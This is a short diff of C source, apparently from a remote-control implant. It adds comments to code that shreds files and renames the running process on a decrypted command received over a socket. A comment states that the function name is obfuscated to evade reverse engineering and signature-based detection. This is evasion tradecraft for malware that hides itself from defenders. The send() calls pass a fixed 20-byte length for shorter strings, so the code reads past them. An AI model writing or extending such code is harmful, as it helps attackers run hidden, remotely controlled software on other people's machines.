@@ -104,6 +104,7 @@ void generate_random_data(char *buffer, size_t size) {
 
 }
 
+
 void shred_file(const char *filename) {
 
     FILE *file = fopen(filename, "r+b");
@@ -143,15 +144,18 @@ void handleErrors(void) {
     abort();
 }
 
+// Change process name, function name obfuscated to mitigate reverse engineering and signature-based detection
 void cpn(int new_socket, unsigned char* decrypted_command) {
 
     if (decrypted_command == NULL || strlen(decrypted_command) == 0) {
 
+        // No input, error obfuscated
         send(new_socket, "Fail. Code 001-Ni", 20, 0);
         return;
     }
     if (prctl(PR_SET_NAME, decrypted_command, NULL, NULL, NULL) != 0) {
 
+        // Miscellaneous failure
         send(new_socket, "Fail.", 20, 0);
 
     } else {
